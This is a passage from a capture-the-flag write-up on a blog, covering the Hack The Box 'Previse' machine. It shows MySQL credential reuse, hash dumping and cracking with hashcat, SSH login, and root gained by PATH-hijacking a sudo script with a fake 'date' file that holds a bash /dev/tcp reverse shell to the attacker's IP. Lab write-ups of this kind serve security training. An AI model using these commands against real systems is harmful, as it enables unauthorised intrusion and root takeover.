</span></span><span class=line><span class=cl>    <span class=nv>$mycon</span> <span class=o>=</span> new mysqli<span class=o>(</span><span class=nv>$host</span>, <span class=nv>$user</span>, <span class=nv>$passwd</span>, <span class=nv>$db</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$mycon</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>?&gt;
</span></span></code></pre></div><p>Connecting to the database and viewing its data:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@previse:/var/www/html$ mysql -h localhost -u root -p<span class=s1>&#39;mySQL_p@ssw0rd!:)&#39;</span>
</span></span><span class=line><span class=cl>mysql&gt; show databases<span class=p>;</span>
</span></span><span class=line><span class=cl>show databases<span class=p>;</span>
</span></span><span class=line><span class=cl>+--------------------+
</span></span><span class=line><span class=cl><span class=p>|</span> Database           <span class=p>|</span>
</span></span><span class=line><span class=cl>+--------------------+
</span></span><span class=line><span class=cl><span class=p>|</span> information_schema <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> mysql              <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> performance_schema <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> previse            <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> sys                <span class=p>|</span>
</span></span><span class=line><span class=cl>+--------------------+
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>mysql&gt; use previse<span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>mysql&gt; show tables<span class=p>;</span>
</span></span><span class=line><span class=cl>show tables<span class=p>;</span>
</span></span><span class=line><span class=cl>+-------------------+
</span></span><span class=line><span class=cl><span class=p>|</span> Tables_in_previse <span class=p>|</span>
</span></span><span class=line><span class=cl>+-------------------+
</span></span><span class=line><span class=cl><span class=p>|</span> accounts          <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> files             <span class=p>|</span>
</span></span><span class=line><span class=cl>+-------------------+
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>mysql&gt; <span class=k>select</span> * from accounts<span class=p>;</span>
</span></span><span class=line><span class=cl>+----+----------+------------------------------------+---------------------+
</span></span><span class=line><span class=cl><span class=p>|</span> id <span class=p>|</span> username <span class=p>|</span> password                           <span class=p>|</span> created_at          <span class=p>|</span>
</span></span><span class=line><span class=cl>+----+----------+------------------------------------+---------------------+
</span></span><span class=line><span class=cl><span class=p>|</span>  <span class=m>1</span> <span class=p>|</span> m4lwhere <span class=p>|</span> <span class=nv>$1</span>$ðŸ§‚llol<span class=nv>$DQpmdvnb7EeuO6UaqRItf</span>. <span class=p>|</span> 2021-05-27 18:18:36 <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span>  <span class=m>2</span> <span class=p>|</span> tester   <span class=p>|</span> <span class=nv>$1</span>$ðŸ§‚llol<span class=nv>$UfA76</span>/dcHlnMNoOlgyaZq1 <span class=p>|</span> 2022-08-13 23:23:06 <span class=p>|</span>
</span></span><span class=line><span class=cl>+----+----------+------------------------------------+---------------------+
</span></span></code></pre></div><p>The database shows a couple accounts, including m4lwhere, who is the only user on the machine.
Now to crack the password hash for the m4lwhere user.</p><h3 id=password-crack>Password Crack<a hidden class=anchor aria-hidden=true href=#password-crack>#</a></h3><p>Copying the hash to a file called hash.txt and running <code>hashcat</code> against it to crack it. The password looks to be a md5crypt (based on <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</a>)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>kali@kali:~/ctf/htb/machines/previse$ hashcat -m <span class=m>500</span> hash.txt /usr/share/wordlists/rockyou.txt
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl><span class=nv>$1</span>$ðŸ§‚llol<span class=nv>$DQpmdvnb7EeuO6UaqRItf</span>.:ilovecody112235!
</span></span></code></pre></div><h3 id=ssh>SSH<a hidden class=anchor aria-hidden=true href=#ssh>#</a></h3><p>Now with the cracked password hash, the m4lwhere user can be logged into over SSH.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>kali@kali:~/ctf/htb/machines/previse$ ssh m4lwhere@10.10.11.104
</span></span><span class=line><span class=cl>m4lwhere@10.10.11.104<span class=err>&#39;</span>s password: ilovecody112235!
</span></span></code></pre></div><p>And a shell as the m4lwhere user is gained:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Welcome to Ubuntu 18.04.5 LTS <span class=o>(</span>GNU/Linux 4.15.0-151-generic x86_64<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> * Documentation:  https://help.ubuntu.com
</span></span><span class=line><span class=cl> * Management:     https://landscape.canonical.com
</span></span><span class=line><span class=cl> * Support:        https://ubuntu.com/advantage
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  System information as of Sun Aug <span class=m>14</span> 00:31:06 UTC <span class=m>2022</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  System load:  0.0               Processes:           <span class=m>180</span>
</span></span><span class=line><span class=cl>  Usage of /:   51.3% of 4.85GB   Users logged in:     <span class=m>0</span>
</span></span><span class=line><span class=cl>  Memory usage: 28%               IP address <span class=k>for</span> eth0: 10.10.11.104
</span></span><span class=line><span class=cl>  Swap usage:   0%
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>0</span> updates can be applied immediately.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Last login: Fri Jun <span class=m>18</span> 01:09:10 <span class=m>2021</span> from 10.10.10.5
</span></span><span class=line><span class=cl>m4lwhere@previse:~$ whoami
</span></span><span class=line><span class=cl>m4lwhere
</span></span><span class=line><span class=cl>m4lwhere@previse:~$ id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1000<span class=o>(</span>m4lwhere<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1000<span class=o>(</span>m4lwhere<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1000<span class=o>(</span>m4lwhere<span class=o>)</span>
</span></span><span class=line><span class=cl>m4lwhere@previse:~$ hostname
</span></span><span class=line><span class=cl>previse
</span></span></code></pre></div><h4 id=usertxt>user.txt<a hidden class=anchor aria-hidden=true href=#usertxt>#</a></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>m4lwhere@previse:~$ cat user.txt 
</span></span><span class=line><span class=cl>652e288e09fd164a...
</span></span></code></pre></div><h2 id=root>root<a hidden class=anchor aria-hidden=true href=#root>#</a></h2><h3 id=sudo--l>sudo -l<a hidden class=anchor aria-hidden=true href=#sudo--l>#</a></h3><p>Checking the sudo privileges the m4lwhere has:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>m4lwhere@previse:~$ sudo -l
</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> password <span class=k>for</span> m4lwhere: 
</span></span><span class=line><span class=cl>User m4lwhere may run the following commands on previse:
</span></span><span class=line><span class=cl>    <span class=o>(</span>root<span class=o>)</span> /opt/scripts/access_backup.sh
</span></span></code></pre></div><p>Looking at the script that can be run with root privileges:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh
</span></span><span class=line><span class=cl><span class=c1>#!/bin/bash</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># We always make sure to store logs, we take security SERIOUSLY here</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># I know I shouldnt run this as root but I cant figure it out programmatically on my account</span>
</span></span><span class=line><span class=cl><span class=c1># This is configured to run with cron, added to sudo so I can run as needed - we&#39;ll fix it later when there&#39;s time</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>gzip -c /var/log/apache2/access.log &gt; /var/backups/<span class=k>$(</span>date --date<span class=o>=</span><span class=s2>&#34;yesterday&#34;</span> +%Y%b%d<span class=k>)</span>_access.gz
</span></span><span class=line><span class=cl>gzip -c /var/www/file_access.log &gt; /var/backups/<span class=k>$(</span>date --date<span class=o>=</span><span class=s2>&#34;yesterday&#34;</span> +%Y%b%d<span class=k>)</span>_file_access.gz
</span></span></code></pre></div><p>It looks like the <code>gzip</code> command is using the <code>date</code> command without specifying the full path.
So it should be possible to create a malicious date file, add that to the beginning of the m4lwhere user&rsquo;s PATH, and have it executed within the access_backup.sh script as root.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>m4lwhere@previse:~$ <span class=nb>echo</span> <span class=s1>&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.5/4444 0&gt;&amp;1&#39;</span> &gt; date
</span></span><span class=line><span class=cl>m4lwhere@previse:~$ cat date 
</span></span><span class=line><span class=cl>bash -i &gt;<span class=p>&amp;</span> /dev/tcp/10.10.14.5/4444 0&gt;<span class=p>&amp;</span><span class=m>1</span>
</span></span><span class=line><span class=cl>m4lwhere@previse:~$ chmod +x date
</span></span><span class=line><span class=cl>m4lwhere@previse:~$ <span class=nb>export</span> <span class=nv>PATH</span><span class=o>=</span>/home/m4lwhere/:<span class=nv>$PATH</span>
</span></span></code></pre></div><p>Started a <code>netcat</code> listener:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>kali@kali:~/ctf/htb/machines/previse$ nc -lvnp <span class=m>4444</span>
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>4444</span> ...
</span></span></code></pre></div><p>Executed the access_backup.sh script with <code>sudo</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>m4lwhere@previse:~$ sudo /opt/scripts/access_backup.sh 
</span></span></code></pre></div><p>And the reverse shell returns with root access:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.5<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.11.104<span class=o>]</span> <span class=m>50360</span>
</span></span><span class=line><span class=cl>root@previse:~# 
</span></span><span class=line><span class=cl>root@previse:~# whoami
</span></span><span class=line><span class=cl>whoami
</span></span><span class=line><span class=cl>root
</span></span><span class=line><span class=cl>root@previse:~# id
</span></span><span class=line><span class=cl>id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span>
</span></span><span class=line><span class=cl>root@previse:~# hostname
</span></span><span class=line><span class=cl>hostname
</span></span><span class=line><span class=cl>previse
</span></span></code></pre></div><h4 id=roottxt>root.txt<a hidden class=anchor aria-hidden=true href=#roottxt>#</a></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root@previse:/root# cat root.txt
</span></span><span class=line><span class=cl>cat root.txt
</span></span><span class=line><span class=cl>a01417a61ab18617...
</span></span></code></pre></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://H3r1CH.github.io/tags/hackthebox/>hackthebox</a></li><li><a href=https://H3r1CH.github.io/tags/linux/>linux</a></li><li><a href=https://H3r1CH.github.io/tags/idor/>idor</a></li><li><a href=https://H3r1CH.github.io/tags/command-injection/>command-injection</a></li></ul><nav class=paginav><a class=prev href=https://H3r1CH.github.io/writeups/hackthebox/jerry/><span class=title>Â« Prev</span><br><span>Jerry</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share Previse on twitter" href="https://twitter.com/intent/tweet/?text=Previse&url=https%3a%2f%2fH3r1CH.github.io%2fwriteups%2fhackthebox%2fprevise%2f&hashtags=hackthebox%2clinux%2cidor%2ccommand-injection"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Previse on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fH3r1CH.github.io%2fwriteups%2fhackthebox%2fprevise%2f&title=Previse&summary=Previse&source=https%3a%2f%2fH3r1CH.github.io%2fwriteups%2fhackthebox%2fprevise%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Previse on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fH3r1CH.github.io%2fwriteups%2fhackthebox%2fprevise%2f&title=Previse"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Previse on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fH3r1CH.github.io%2fwriteups%2fhackthebox%2fprevise%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Previse on whatsapp" href="https://api.whatsapp.com/send?text=Previse%20-%20https%3a%2f%2fH3r1CH.github.io%2fwriteups%2fhackthebox%2fprevise%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Previse on telegram" href="https://telegram.me/share/url?text=Previse&url=https%3a%2f%2fH3r1CH.github.io%2fwriteups%2fhackthebox%2fprevise%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://H3r1CH.github.io/>My New Hugo Site</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>